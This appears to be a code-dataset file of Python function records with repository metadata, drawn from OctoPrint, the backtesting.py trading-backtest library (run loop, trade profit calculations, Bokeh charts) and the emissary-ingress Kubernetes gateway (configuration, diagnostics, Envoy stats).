{"docstring": "\"\"\"Processes the job.\"\"\"\n\n", "func_signal": "def process(self):\n", "code": "self._thread = threading.Thread(\n    target=self._render,\n    name=\"TimelapseRenderJob_{prefix}_{postfix}\".format(\n        prefix=self._prefix, postfix=self._postfix\n    ),\n)\nself._thread.daemon = True\nself._thread.start()", "path": "OctoPrint/src/octoprint/timelapse.py", "commit_date": "2020-10-08 00:00:00", "repo_name": "OctoPrint/OctoPrint", "stars": 7937, "license": "agpl-3.0", "language": "python", "size": 54370}
{"docstring": "\"\"\"Superimposed, downsampled vbars\"\"\"\n", "func_signal": "def _plot_superimposed_ohlc():\n", "code": "time_resolution = pd.DatetimeIndex(df['datetime']).resolution\nresample_rule = (superimpose if isinstance(superimpose, str) else\n                 dict(day='M',\n                      hour='D',\n                      minute='H',\n                      second='T',\n                      millisecond='S').get(time_resolution))\nif not resample_rule:\n    warnings.warn(\n        f\"'Can't superimpose OHLC data with rule '{resample_rule}'\"\n        f\"(index datetime resolution: '{time_resolution}'). Skipping.\",\n        stacklevel=4)\n    return\n\ndf2 = (df.assign(_width=1).set_index('datetime')\n       .resample(resample_rule, label='left')\n       .agg(dict(OHLCV_AGG, _width='count')))\n\n# Check if resampling was downsampling; error on upsampling\norig_freq = _data_period(df['datetime'])\nresample_freq = _data_period(df2.index)\nif resample_freq < orig_freq:\n    raise ValueError('Invalid value for `superimpose`: Upsampling not supported.')\nif resample_freq == orig_freq:\n    warnings.warn('Superimposed OHLC plot matches the original plot. Skipping.',\n                  stacklevel=4)\n    return\n\ndf2.index = df2['_width'].cumsum().shift(1).fillna(0)\ndf2.index += df2['_width'] / 2 - .5\ndf2['_width'] -= .1  # Candles don't touch\n\ndf2['inc'] = (df2.Close >= df2.Open).astype(int).astype(str)\ndf2.index.name = None\nsource2 = ColumnDataSource(df2)\nfig_ohlc.segment('index', 'High', 'index', 'Low', source=source2, color='#bbbbbb')\ncolors_lighter = [lightness(BEAR_COLOR, .92),\n                  lightness(BULL_COLOR, .92)]\nfig_ohlc.vbar('index', '_width', 'Open', 'Close', source=source2, line_color=None,\n              fill_color=factor_cmap('inc', colors_lighter, ['0', '1']))", "path": "backtesting.py/backtesting/_plotting.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "kernc/backtesting.py", "stars": 4638, "license": "agpl-3.0", "language": "python", "size": 9092}
{"docstring": "\"\"\"\nRun the backtest. Returns `pd.Series` with results and statistics.\n\nKeyword arguments are interpreted as strategy parameters.\n\n    >>> Backtest(GOOG, SmaCross).run()\n    Start                     2004-08-19 00:00:00\n    End                       2013-03-01 00:00:00\n    Duration                   3116 days 00:00:00\n    Exposure Time [%]                     93.9944\n    Equity Final [$]                      51959.9\n    Equity Peak [$]                       75787.4\n    Return [%]                            419.599\n    Buy & Hold Return [%]                 703.458\n    Return (Ann.) [%]                      21.328\n    Volatility (Ann.) [%]                 36.5383\n    Sharpe Ratio                         0.583718\n    Sortino Ratio                         1.09239\n    Calmar Ratio                         0.444518\n    Max. Drawdown [%]                    -47.9801\n    Avg. Drawdown [%]                    -5.92585\n    Max. Drawdown Duration      584 days 00:00:00\n    Avg. Drawdown Duration       41 days 00:00:00\n    # Trades                                   65\n    Win Rate [%]                          46.1538\n    Best Trade [%]                         53.596\n    Worst Trade [%]                      -18.3989\n    Avg. Trade [%]                        2.35371\n    Max. Trade Duration         183 days 00:00:00\n    Avg. Trade Duration          46 days 00:00:00\n    Profit Factor                         2.08802\n    Expectancy [%]                        8.79171\n    SQN                                  0.916893\n    _strategy                            SmaCross\n    _equity_curve                           Eq...\n    _trades                       Size  EntryB...\n    dtype: object\n\"\"\"\n", "func_signal": "def run(self, **kwargs) -> pd.Series:\n", "code": "data = _Data(self._data.copy(deep=False))\nbroker: _Broker = self._broker(data=data)\nstrategy: Strategy = self._strategy(broker, data, kwargs)\n\nstrategy.init()\ndata._update()  # Strategy.init might have changed/added to data.df\n\n# Indicators used in Strategy.next()\nindicator_attrs = {attr: indicator\n                   for attr, indicator in strategy.__dict__.items()\n                   if isinstance(indicator, _Indicator)}.items()\n\n# Skip first few candles where indicators are still \"warming up\"\n# +1 to have at least two entries available\nstart = 1 + max((np.isnan(indicator.astype(float)).argmin(axis=-1).max()\n                 for _, indicator in indicator_attrs), default=0)\n\n# Disable \"invalid value encountered in ...\" warnings. Comparison\n# np.nan >= 3 is not invalid; it's False.\nwith np.errstate(invalid='ignore'):\n\n    for i in range(start, len(self._data)):\n        # Prepare data and indicators for `next` call\n        data._set_length(i + 1)\n        for attr, indicator in indicator_attrs:\n            # Slice indicator on the last dimension (case of 2d indicator)\n            setattr(strategy, attr, indicator[..., :i + 1])\n\n        # Handle orders processing and broker stuff\n        try:\n            broker.next()\n        except _OutOfMoneyError:\n            break\n\n        # Next tick, a moment before bar close\n        strategy.next()\n    else:\n        # Close any remaining open trades so they produce some stats\n        for trade in broker.trades:\n            trade.close()\n\n        # Re-run broker one last time to handle orders placed in the last strategy\n        # iteration. Use the same OHLC values as in the last broker iteration.\n        if start < len(self._data):\n            try_(broker.next, exception=_OutOfMoneyError)\n\n    # Set data back to full length\n    # for future `indicator._opts['data'].index` calls to work\n    data._set_length(len(self._data))\n\n    self._results = self._compute_stats(broker, strategy)\nreturn self._results", "path": "backtesting.py/backtesting/backtesting.py", "commit_date": "2020-12-12 00:00:00", "repo_name": "kernc/backtesting.py", "stars": 4638, "license": "agpl-3.0", "language": "python", "size": 9092}
{"docstring": "# TODO: Warn on deprecations from the previous version. Remove in the next.\n", "func_signal": "def __getattr__(self, item):\n", "code": "removed_attrs = ('entry', 'set_entry', 'is_long', 'is_short',\n                 'sl', 'tp', 'set_sl', 'set_tp')\nif item in removed_attrs:\n    raise AttributeError(f'Strategy.orders.{\"/.\".join(removed_attrs)} were removed in'\n                         'Backtesting 0.2.0. '\n                         'Use `Order` API instead. See docs.')\nraise AttributeError(f\"'tuple' object has no attribute {item!r}\")", "path": "backtesting.py/backtesting/backtesting.py", "commit_date": "2020-12-12 00:00:00", "repo_name": "kernc/backtesting.py", "stars": 4638, "license": "agpl-3.0", "language": "python", "size": 9092}
{"docstring": "# From https://github.com/QuantConnect/Lean/pull/3768\n", "func_signal": "def margin_available(self) -> float:\n", "code": "margin_used = sum(trade.value / self._leverage for trade in self.trades)\nreturn max(0, self.equity - margin_used)", "path": "backtesting.py/backtesting/backtesting.py", "commit_date": "2020-12-12 00:00:00", "repo_name": "kernc/backtesting.py", "stars": 4638, "license": "agpl-3.0", "language": "python", "size": 9092}
{"docstring": "\"\"\"Datetime of when the trade was exited.\"\"\"\n", "func_signal": "def exit_time(self) -> Optional[Union[pd.Timestamp, int]]:\n", "code": "if self.__exit_bar is None:\n    return None\nreturn self.__broker._data.index[self.__exit_bar]", "path": "backtesting.py/backtesting/backtesting.py", "commit_date": "2020-12-12 00:00:00", "repo_name": "kernc/backtesting.py", "stars": 4638, "license": "agpl-3.0", "language": "python", "size": 9092}
{"docstring": "# Prevent expansion due to _equity and _trades dfs\n", "func_signal": "def __repr__(self):\n", "code": "with pd.option_context('max_colwidth', 20):\n    return super().__repr__()", "path": "backtesting.py/backtesting/backtesting.py", "commit_date": "2020-12-12 00:00:00", "repo_name": "kernc/backtesting.py", "stars": 4638, "license": "agpl-3.0", "language": "python", "size": 9092}
{"docstring": "\"\"\"Profit (positive) or loss (negative) of the current position in percent.\"\"\"\n", "func_signal": "def pl_pct(self) -> float:\n", "code": "weights = np.abs([trade.size for trade in self.__broker.trades])\nweights = weights / weights.sum()\npl_pcts = np.array([trade.pl_pct for trade in self.__broker.trades])\nreturn (pl_pcts * weights).sum()", "path": "backtesting.py/backtesting/backtesting.py", "commit_date": "2020-12-12 00:00:00", "repo_name": "kernc/backtesting.py", "stars": 4638, "license": "agpl-3.0", "language": "python", "size": 9092}
{"docstring": "\"\"\"Strategy indicators\"\"\"\n\n", "func_signal": "def _plot_indicators():\n", "code": "def _too_many_dims(value):\n    assert value.ndim >= 2\n    if value.ndim > 2:\n        warnings.warn(f\"Can't plot indicators with >2D ('{value.name}')\",\n                      stacklevel=5)\n        return True\n    return False\n\nclass LegendStr(str):\n    # The legend string is such a string that only matches\n    # itself if it's the exact same object. This ensures\n    # legend items are listed separately even when they have the\n    # same string contents. Otherwise, Bokeh would always consider\n    # equal strings as one and the same legend item.\n    def __eq__(self, other):\n        return self is other\n\nohlc_colors = colorgen()\nindicator_figs = []\n\nfor i, value in enumerate(indicators):\n    value = np.atleast_2d(value)\n\n    # Use .get()! A user might have assigned a Strategy.data-evolved\n    # _Array without Strategy.I()\n    if not value._opts.get('plot') or _too_many_dims(value):\n        continue\n\n    is_overlay = value._opts['overlay']\n    is_scatter = value._opts['scatter']\n    if is_overlay:\n        fig = fig_ohlc\n    else:\n        fig = new_indicator_figure()\n        indicator_figs.append(fig)\n    tooltips = []\n    colors = value._opts['color']\n    colors = colors and cycle(_as_list(colors)) or (\n        cycle([next(ohlc_colors)]) if is_overlay else colorgen())\n    legend_label = LegendStr(value.name)\n    for j, arr in enumerate(value, 1):\n        color = next(colors)\n        source_name = f'{legend_label}_{i}_{j}'\n        if arr.dtype == bool:\n            arr = arr.astype(int)\n        source.add(arr, source_name)\n        tooltips.append(f'@{{{source_name}}}{{0,0.0[0000]}}')\n        if is_overlay:\n            ohlc_extreme_values[source_name] = arr\n            if is_scatter:\n                fig.scatter(\n                    'index', source_name, source=source,\n                    legend_label=legend_label, color=color,\n                    line_color='black', fill_alpha=.8,\n                    marker='circle', radius=BAR_WIDTH / 2 * 1.5)\n            else:\n                fig.line(\n                    'index', source_name, source=source,\n                    legend_label=legend_label, line_color=color,\n                    line_width=1.3)\n        else:\n            if is_scatter:\n                r = fig.scatter(\n                    'index', source_name, source=source,\n                    legend_label=LegendStr(legend_label), color=color,\n                    marker='circle', radius=BAR_WIDTH / 2 * .9)\n            else:\n                r = fig.line(\n                    'index', source_name, source=source,\n                    legend_label=LegendStr(legend_label), line_color=color,\n                    line_width=1.3)\n            # Add dashed centerline just because\n            mean = float(pd.Series(arr).mean())\n            if not np.isnan(mean) and (abs(mean) < .1 or\n                                       round(abs(mean), 1) == .5 or\n                                       round(abs(mean), -1) in (50, 100, 200)):\n                fig.add_layout(Span(location=float(mean), dimension='width',\n                                    line_color='#666666', line_dash='dashed',\n                                    line_width=.5))\n    if is_overlay:\n        ohlc_tooltips.append((legend_label, NBSP.join(tooltips)))\n    else:\n        set_tooltips(fig, [(legend_label, NBSP.join(tooltips))], vline=True, renderers=[r])\n        # If the sole indicator line on this figure,\n        # have the legend only contain text without the glyph\n        if len(value) == 1:\n            fig.legend.glyph_width = 0\nreturn indicator_figs", "path": "backtesting.py/backtesting/_plotting.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "kernc/backtesting.py", "stars": 4638, "license": "agpl-3.0", "language": "python", "size": 9092}
{"docstring": "\"\"\"Trade total value in cash (volume \u00d7 price).\"\"\"\n", "func_signal": "def value(self):\n", "code": "price = self.__exit_price or self.__broker.last_price\nreturn abs(self.__size) * price", "path": "backtesting.py/backtesting/backtesting.py", "commit_date": "2020-12-12 00:00:00", "repo_name": "kernc/backtesting.py", "stars": 4638, "license": "agpl-3.0", "language": "python", "size": 9092}
{"docstring": "\"\"\"Trade profit (positive) or loss (negative) in cash units.\"\"\"\n", "func_signal": "def pl(self):\n", "code": "price = self.__exit_price or self.__broker.last_price\nreturn self.__size * (price - self.__entry_price)", "path": "backtesting.py/backtesting/backtesting.py", "commit_date": "2020-12-12 00:00:00", "repo_name": "kernc/backtesting.py", "stars": 4638, "license": "agpl-3.0", "language": "python", "size": 9092}
{"docstring": "\"\"\"Volume section\"\"\"\n", "func_signal": "def _plot_volume_section():\n", "code": "fig = new_indicator_figure(y_axis_label=\"Volume\")\nfig.xaxis.formatter = fig_ohlc.xaxis[0].formatter\nfig.xaxis.visible = True\nfig_ohlc.xaxis.visible = False  # Show only Volume's xaxis\nr = fig.vbar('index', BAR_WIDTH, 'Volume', source=source, color=inc_cmap)\nset_tooltips(fig, [('Volume', '@Volume{0.00 a}')], renderers=[r])\nfig.yaxis.formatter = NumeralTickFormatter(format=\"0 a\")\nreturn fig", "path": "backtesting.py/backtesting/_plotting.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "kernc/backtesting.py", "stars": 4638, "license": "agpl-3.0", "language": "python", "size": 9092}
{"docstring": "\"\"\"Equity section\"\"\"\n# Max DD Dur. line\n", "func_signal": "def _plot_equity_section(is_return=False):\n", "code": "equity = equity_data['Equity'].copy()\ndd_end = equity_data['DrawdownDuration'].idxmax()\nif np.isnan(dd_end):\n    dd_start = dd_end = equity.index[0]\nelse:\n    dd_start = equity[:dd_end].idxmax()\n    # If DD not extending into the future, get exact point of intersection with equity\n    if dd_end != equity.index[-1]:\n        dd_end = np.interp(equity[dd_start],\n                           (equity[dd_end - 1], equity[dd_end]),\n                           (dd_end - 1, dd_end))\n\nif smooth_equity:\n    interest_points = pd.Index([\n        # Beginning and end\n        equity.index[0], equity.index[-1],\n        # Peak equity and peak DD\n        equity.idxmax(), equity_data['DrawdownPct'].idxmax(),\n        # Include max dd end points. Otherwise the MaxDD line looks amiss.\n        dd_start, int(dd_end), min(int(dd_end + 1), equity.size - 1),\n    ])\n    select = pd.Index(trades['ExitBar']).union(interest_points)\n    select = select.unique().dropna()\n    equity = equity.iloc[select].reindex(equity.index)\n    equity.interpolate(inplace=True)\n\nassert equity.index.equals(equity_data.index)\n\nif relative_equity:\n    equity /= equity.iloc[0]\nif is_return:\n    equity -= equity.iloc[0]\n\nyaxis_label = 'Return' if is_return else 'Equity'\nsource_key = 'eq_return' if is_return else 'equity'\nsource.add(equity, source_key)\nfig = new_indicator_figure(\n    y_axis_label=yaxis_label,\n    **({} if plot_drawdown else dict(plot_height=110)))\n\n# High-watermark drawdown dents\nfig.patch('index', 'equity_dd',\n          source=ColumnDataSource(dict(\n              index=np.r_[index, index[::-1]],\n              equity_dd=np.r_[equity, equity.cummax()[::-1]]\n          )),\n          fill_color='#ffffea', line_color='#ffcb66')\n\n# Equity line\nr = fig.line('index', source_key, source=source, line_width=1.5, line_alpha=1)\nif relative_equity:\n    tooltip_format = f'@{source_key}{{+0,0.[000]%}}'\n    tick_format = '0,0.[00]%'\n    legend_format = '{:,.0f}%'\nelse:\n    tooltip_format = f'@{source_key}{{$ 0,0}}'\n    tick_format = '$ 0.0 a'\n    legend_format = '${:,.0f}'\nset_tooltips(fig, [(yaxis_label, tooltip_format)], renderers=[r])\nfig.yaxis.formatter = NumeralTickFormatter(format=tick_format)\n\n# Peaks\nargmax = equity.idxmax()\nfig.scatter(argmax, equity[argmax],\n            legend_label='Peak ({})'.format(\n                legend_format.format(equity[argmax] * (100 if relative_equity else 1))),\n            color='cyan', size=8)\nfig.scatter(index[-1], equity.values[-1],\n            legend_label='Final ({})'.format(\n                legend_format.format(equity.iloc[-1] * (100 if relative_equity else 1))),\n            color='blue', size=8)\n\nif not plot_drawdown:\n    drawdown = equity_data['DrawdownPct']\n    argmax = drawdown.idxmax()\n    fig.scatter(argmax, equity[argmax],\n                legend_label='Max Drawdown (-{:.1f}%)'.format(100 * drawdown[argmax]),\n                color='red', size=8)\ndd_timedelta_label = df['datetime'].iloc[int(round(dd_end))] - df['datetime'].iloc[dd_start]\nfig.line([dd_start, dd_end], equity.iloc[dd_start],\n         line_color='red', line_width=2,\n         legend_label=f'Max Dd Dur. ({dd_timedelta_label})'\n         .replace(' 00:00:00', '')\n         .replace('(0 days ', '('))\n\nfigs_above_ohlc.append(fig)", "path": "backtesting.py/backtesting/_plotting.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "kernc/backtesting.py", "stars": 4638, "license": "agpl-3.0", "language": "python", "size": 9092}
{"docstring": "\"\"\"Return data index period as pd.Timedelta\"\"\"\n", "func_signal": "def _data_period(index) -> Union[pd.Timedelta, Number]:\n", "code": "values = pd.Series(index[-100:])\nreturn values.diff().dropna().median()", "path": "backtesting.py/backtesting/_util.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "kernc/backtesting.py", "stars": 4638, "license": "agpl-3.0", "language": "python", "size": 9092}
{"docstring": "\"\"\"Cancel all non-contingent (i.e. SL/TP) orders.\"\"\"\n", "func_signal": "def cancel(self):\n", "code": "for order in self:\n    if not order.is_contingent:\n        order.cancel()", "path": "backtesting.py/backtesting/backtesting.py", "commit_date": "2020-12-12 00:00:00", "repo_name": "kernc/backtesting.py", "stars": 4638, "license": "agpl-3.0", "language": "python", "size": 9092}
{"docstring": "\"\"\"Profit/Loss markers section\"\"\"\n", "func_signal": "def _plot_pl_section():\n", "code": "fig = new_indicator_figure(y_axis_label=\"Profit / Loss\")\nfig.add_layout(Span(location=0, dimension='width', line_color='#666666',\n                    line_dash='dashed', line_width=1))\nreturns_long = np.where(trades['Size'] > 0, trades['ReturnPct'], np.nan)\nreturns_short = np.where(trades['Size'] < 0, trades['ReturnPct'], np.nan)\nsize = trades['Size'].abs()\nsize = np.interp(size, (size.min(), size.max()), (8, 20))\ntrade_source.add(returns_long, 'returns_long')\ntrade_source.add(returns_short, 'returns_short')\ntrade_source.add(size, 'marker_size')\nif 'count' in trades:\n    trade_source.add(trades['count'], 'count')\nr1 = fig.scatter('index', 'returns_long', source=trade_source, fill_color=cmap,\n                 marker='triangle', line_color='black', size='marker_size')\nr2 = fig.scatter('index', 'returns_short', source=trade_source, fill_color=cmap,\n                 marker='inverted_triangle', line_color='black', size='marker_size')\ntooltips = [(\"Size\", \"@size{0,0}\")]\nif 'count' in trades:\n    tooltips.append((\"Count\", \"@count{0,0}\"))\nset_tooltips(fig, tooltips + [(\"P/L\", \"@returns_long{+0.[000]%}\")],\n             vline=False, renderers=[r1])\nset_tooltips(fig, tooltips + [(\"P/L\", \"@returns_short{+0.[000]%}\")],\n             vline=False, renderers=[r2])\nfig.yaxis.formatter = NumeralTickFormatter(format=\"0.[00]%\")\nreturn fig", "path": "backtesting.py/backtesting/_plotting.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "kernc/backtesting.py", "stars": 4638, "license": "agpl-3.0", "language": "python", "size": 9092}
{"docstring": "\"\"\"Main OHLC bars\"\"\"\n", "func_signal": "def _plot_ohlc():\n", "code": "fig_ohlc.segment('index', 'High', 'index', 'Low', source=source, color=\"black\")\nr = fig_ohlc.vbar('index', BAR_WIDTH, 'Open', 'Close', source=source,\n                  line_color=\"black\", fill_color=inc_cmap)\nreturn r", "path": "backtesting.py/backtesting/_plotting.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "kernc/backtesting.py", "stars": 4638, "license": "agpl-3.0", "language": "python", "size": 9092}
{"docstring": "\"\"\"\nSet Bokeh to output either to a file or Jupyter notebook.\nBy default, Bokeh outputs to notebook if running from within\nnotebook was detected.\n\"\"\"\n", "func_signal": "def set_bokeh_output(notebook=False):\n", "code": "global IS_JUPYTER_NOTEBOOK\nIS_JUPYTER_NOTEBOOK = notebook", "path": "backtesting.py/backtesting/_plotting.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "kernc/backtesting.py", "stars": 4638, "license": "agpl-3.0", "language": "python", "size": 9092}
{"docstring": "\"\"\"Trade profit (positive) or loss (negative) in percent.\"\"\"\n", "func_signal": "def pl_pct(self):\n", "code": "price = self.__exit_price or self.__broker.last_price\nreturn copysign(1, self.__size) * (price / self.__entry_price - 1)", "path": "backtesting.py/backtesting/backtesting.py", "commit_date": "2020-12-12 00:00:00", "repo_name": "kernc/backtesting.py", "stars": 4638, "license": "agpl-3.0", "language": "python", "size": 9092}
{"docstring": "\"\"\"Drawdown section\"\"\"\n", "func_signal": "def _plot_drawdown_section():\n", "code": "fig = new_indicator_figure(y_axis_label=\"Drawdown\")\ndrawdown = equity_data['DrawdownPct']\nargmax = drawdown.idxmax()\nsource.add(drawdown, 'drawdown')\nr = fig.line('index', 'drawdown', source=source, line_width=1.3)\nfig.scatter(argmax, drawdown[argmax],\n            legend_label='Peak (-{:.1f}%)'.format(100 * drawdown[argmax]),\n            color='red', size=8)\nset_tooltips(fig, [('Drawdown', '@drawdown{-0.[0]%}')], renderers=[r])\nfig.yaxis.formatter = NumeralTickFormatter(format=\"-0.[0]%\")\nreturn fig", "path": "backtesting.py/backtesting/_plotting.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "kernc/backtesting.py", "stars": 4638, "license": "agpl-3.0", "language": "python", "size": 9092}
{"docstring": "\"\"\"Trade entry / exit markers on OHLC plot\"\"\"\n", "func_signal": "def _plot_ohlc_trades():\n", "code": "trade_source.add(trades[['EntryBar', 'ExitBar']].values.tolist(), 'position_lines_xs')\ntrade_source.add(trades[['EntryPrice', 'ExitPrice']].values.tolist(), 'position_lines_ys')\nfig_ohlc.multi_line(xs='position_lines_xs', ys='position_lines_ys',\n                    source=trade_source, line_color=trades_cmap,\n                    legend_label=f'Trades ({len(trades)})',\n                    line_width=8, line_alpha=1, line_dash='dotted')", "path": "backtesting.py/backtesting/_plotting.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "kernc/backtesting.py", "stars": 4638, "license": "agpl-3.0", "language": "python", "size": 9092}
{"docstring": "\"\"\"\nResets this Config to the empty, default state so it can load a new config.\n\"\"\"\n\n", "func_signal": "def _reset(self) -> None:\n", "code": "self.logger.debug(\"ACONF RESET\")\n\nself.current_resource = None\nself.helm_chart = None\n\nself.validators = {}\nself.config = {}\n\nself.breakers = {}\nself.outliers = {}\n\nself.counters = collections.defaultdict(lambda: 0)\n\nself.sources = {}\n\n# Save our magic internal sources.\nself.save_source(ACResource.internal_resource())\nself.save_source(ACResource.diagnostics_resource())\n\nself.errors = {}\nself.notices = {}\nself.fatal_errors = 0\nself.object_errors = 0\n\nself.fast_validation_disagreements = {}\n\n# Build up the Ambassador node name.\n#\n# XXX This should be overrideable by the Ambassador module.\nself.ambassador_nodename = \"%s-%s\" % (os.environ.get('AMBASSADOR_ID', 'ambassador'),\n                                      Config.ambassador_namespace)", "path": "emissary/python/ambassador/config/config.py", "commit_date": "2020-12-18 00:00:00", "repo_name": "emissary-ingress/emissary", "stars": 4240, "license": "apache-2.0", "language": "python", "size": 119800}
{"docstring": "\"\"\"\nSplit a key into its components (the base name and the object index).\n\n:param key: possibly-qualified key\n:return: tuple of the base and a possible index\n\"\"\"\n\n", "func_signal": "def split_key(key) -> Tuple[str, Optional[str]]:\n", "code": "key_base = key\nkey_index = None\n\nm = Diagnostics.reKeyIndex.search(key)\n\nif m:\n    key_base = key[:m.start()]\n    key_index = m.group(1)\n\nreturn key_base, key_index", "path": "emissary/python/ambassador/diagnostics/diagnostics.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "emissary-ingress/emissary", "stars": 4240, "license": "apache-2.0", "language": "python", "size": 119800}
{"docstring": "# Removes all potential null values\n", "func_signal": "def sanitize_pre_json(input):\n", "code": "if isinstance(input, dict):\n    for key, value in list(input.items()):\n        if value is None:\n            del input[key]\n        else:\n            sanitize_pre_json(value)\nelif isinstance(input, list):\n    for item in input:\n        sanitize_pre_json(item)\nreturn input", "path": "emissary/python/ambassador/envoy/common.py", "commit_date": "2020-11-11 00:00:00", "repo_name": "emissary-ingress/emissary", "stars": 4240, "license": "apache-2.0", "language": "python", "size": 119800}
{"docstring": "\"\"\"\nRemember information about a given Ambassador-wide service (Auth, RateLimit, Tracing).\n\n:param svc: service record\n:param type_name: what kind of thing is this?\n\"\"\"\n\n", "func_signal": "def add_ambassador_service(self, svc, type_name) -> None:\n", "code": "cluster = svc.cluster\nurls = cluster.urls\n\nsvc_weight = 100.0 / len(urls)\n\nfor url in urls:\n    self.ambassador_services.append({\n        'type': type_name,\n        '_source': svc.location,\n        'name': url,\n        'cluster': cluster.envoy_name,\n        '_service_weight': svc_weight\n    })", "path": "emissary/python/ambassador/diagnostics/diagnostics.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "emissary-ingress/emissary", "stars": 4240, "license": "apache-2.0", "language": "python", "size": 119800}
{"docstring": "\"\"\"\nMake sure we've heard from Envoy within max_ready_age seconds.\n\nIf we haven't yet heard from Envoy at all (we've just booted),\nthen Envoy is not yet ready, and is_ready() returns False.\n\"\"\"\n\n", "func_signal": "def is_ready(self) -> bool:\n", "code": "epoch = self.last_update\n\nif not epoch:\n    return False\n\nreturn (time.time() - epoch) <= self.max_ready_age", "path": "emissary/python/ambassador/diagnostics/envoy_stats.py", "commit_date": "2020-10-07 00:00:00", "repo_name": "emissary-ingress/emissary", "stars": 4240, "license": "apache-2.0", "language": "python", "size": 119800}
{"docstring": "\"\"\"\nReturn the dictionary representation of this SecretInfo.\n\n:return: dict\n\"\"\"\n", "func_signal": "def to_dict(self) -> Dict[str, Any]:\n", "code": "return {\n    'name': self.name,\n    'namespace': self.namespace,\n    'secret_type': self.secret_type,\n    'tls_crt': self.fingerprint(self.tls_crt),\n    'tls_key': self.fingerprint(self.tls_key),\n    'user_key': self.fingerprint(self.user_key),\n    'root_crt': self.fingerprint(self.root_crt)\n}", "path": "emissary/python/ambassador/utils.py", "commit_date": "2020-12-18 00:00:00", "repo_name": "emissary-ingress/emissary", "stars": 4240, "license": "apache-2.0", "language": "python", "size": 119800}
{"docstring": "\"\"\"\nGet the current Envoy stats object, safely.\n\nYou MUST NOT hold the access_lock when calling this method.\n\"\"\"\n\n", "func_signal": "def get_stats(self) -> EnvoyStats:\n", "code": "with self.access_lock:\n    return self.stats", "path": "emissary/python/ambassador/diagnostics/envoy_stats.py", "commit_date": "2020-10-07 00:00:00", "repo_name": "emissary-ingress/emissary", "stars": 4240, "license": "apache-2.0", "language": "python", "size": 119800}
{"docstring": "# get_common_config isn't allowed to be called before add_mappings \n# is called (by ir.walk_saved_resources). So we can assert that \n# self.cluster isn't None here, both to make mypy happier and out\n# of paranoia.\n", "func_signal": "def get_common_config(self) -> dict:\n", "code": "assert(self.cluster)\n\nreturn {\n    \"log_name\": self.name,\n    \"grpc_service\": {\n        \"envoy_grpc\": {\n            \"cluster_name\": self.cluster.envoy_name\n        }\n    },\n    \"buffer_flush_interval\": \"%ds\" % self.flush_interval_time,\n    \"buffer_size_bytes\": self.flush_interval_byte_size,\n}", "path": "emissary/python/ambassador/ir/irlogservice.py", "commit_date": "2020-10-16 00:00:00", "repo_name": "emissary-ingress/emissary", "stars": 4240, "license": "apache-2.0", "language": "python", "size": 119800}
{"docstring": "# See if we can import a protoclass...\n", "func_signal": "def get_proto_validator(self, apiVersion, kind) -> Optional[Validator]:\n", "code": "proto_modname = f\"ambassador.proto.{apiVersion}.{kind}_pb2\"\nproto_classname = f\"{kind}Spec\"\nm = None\n\ntry:\n    m = importlib.import_module(proto_modname)\nexcept ModuleNotFoundError:\n    self.logger.debug(f\"no proto in {proto_modname}\")\n    return None\n\nprotoclass = getattr(m, proto_classname, None)\n\nif not protoclass:\n    self.logger.debug(f\"no class {proto_classname} in {proto_modname}\")\n    return None\n\nself.logger.debug(f\"using validate_with_proto for getambassador.io/{apiVersion} {kind}\")\n\n# Ew. Early binding for Python lambdas is kinda weird.\nreturn typecast(Validator,\n                lambda resource, protoclass=protoclass: self.validate_with_proto(resource, protoclass))", "path": "emissary/python/ambassador/config/config.py", "commit_date": "2020-12-18 00:00:00", "repo_name": "emissary-ingress/emissary", "stars": 4240, "license": "apache-2.0", "language": "python", "size": 119800}
{"docstring": "\"\"\"\nUpdate the Envoy stats object, including our take on Envoy's loglevel and\nlower-level statistics.\n\nYou MUST NOT hold the update lock when calling this method.\nYou MUST NOT hold the access lock when calling this method.\n\nThe first thing that update_envoy_stats does is to acquire the update_lock.\nIf it cannot do so immediately, it assumes that another update is already\nrunning, and returns without doing anything further.\n\nupdate_envoy_stats uses update_log_levels and update_envoy_stats to do all\nthe heavy lifting around talking to Envoy, managing the access_lock, and\nactually writing new data into the Envoy stats object.\n\"\"\"\n\n# self.logger.info(\"updating estats\")\n\n# First up, try bailing early.\n", "func_signal": "def update(self) -> None:\n", "code": "if not self.update_lock.acquire(blocking=False):\n    self.logger.warning(\"EStats update: skipping due to lock contention\")\n    return\n\n# If here, we have the lock. Make sure it gets released!\ntry:\n    # Remember when we started.\n    last_attempt = time.time()\n\n    self.update_log_levels(last_attempt)\n    self.update_envoy_stats(last_attempt)\nexcept Exception as e:\n    self.logger.exception(\"could not update Envoy stats: %s\" % e)\nfinally:\n    self.update_lock.release()", "path": "emissary/python/ambassador/diagnostics/envoy_stats.py", "commit_date": "2020-10-07 00:00:00", "repo_name": "emissary-ingress/emissary", "stars": 4240, "license": "apache-2.0", "language": "python", "size": 119800}
{"docstring": "# If you ask for the cache key and it's not set, that is an error.\n", "func_signal": "def cache_key(self) -> str:\n", "code": "assert(self._cache_key is not None)\nreturn self._cache_key", "path": "emissary/python/ambassador/ir/irresource.py", "commit_date": "2020-08-19 00:00:00", "repo_name": "emissary-ingress/emissary", "stars": 4240, "license": "apache-2.0", "language": "python", "size": 119800}
{"docstring": "# XXX WTFO, I hear you cry again! Can this possibly be thread-safe??!\n# Well, no, not really. But as long as you're not trying to use the\n# cache_key before actually initializing this group, key_for_id()\n# will be idempotent, so it doesn't matter.\n\n", "func_signal": "def cache_key(self) -> str:\n", "code": "if not self._cache_key:\n    self._cache_key = self.__class__.key_for_id(self.group_id)\n\nreturn self._cache_key", "path": "emissary/python/ambassador/ir/irbasemappinggroup.py", "commit_date": "2020-08-19 00:00:00", "repo_name": "emissary-ingress/emissary", "stars": 4240, "license": "apache-2.0", "language": "python", "size": 119800}
